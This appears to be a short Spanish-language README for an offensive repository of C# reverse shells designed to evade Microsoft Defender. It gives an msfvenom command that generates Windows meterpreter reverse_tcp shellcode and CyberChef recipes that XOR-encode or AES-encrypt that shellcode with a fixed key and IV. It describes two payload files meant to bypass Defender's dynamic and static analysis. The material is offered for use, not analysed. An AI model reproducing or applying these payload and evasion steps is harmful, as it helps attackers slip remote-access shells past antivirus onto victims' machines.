# Shell bitecode

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... LPORT=... -f csharp

# Recetas:

### Xor

Encodear 2 veces

    https://gchq.github.io/CyberChef/#recipe=From_Hex('0x%20with%20comma')XOR(%7B'option':'Hex','string':'5c'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)

### AES

    https://gchq.github.io/CyberChef/#recipe=From_Hex('0x%20with%20comma')AES_Encrypt(%7B'option':'Hex','string':'1f768bd57cbf021b251deb0791d8c197'%7D,%7B'option':'Hex','string':'ee7d63936ac1f286d8e4c5ca82dfa5e2'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)To_Base64('A-Za-z0-9%2B/%3D')


# Archivos

### Csharp_revshell

Reverse shell simple creada para baypassear el análisis dinámico del Defender

### Defender_Static_bypass_shell

Reverse shell para bypassear el análisis estático del Defender.

Comprende 3 formas de uso:
1. payload en bitecode
2. Payload pasado por Xor
3. payload encriptado en Aes
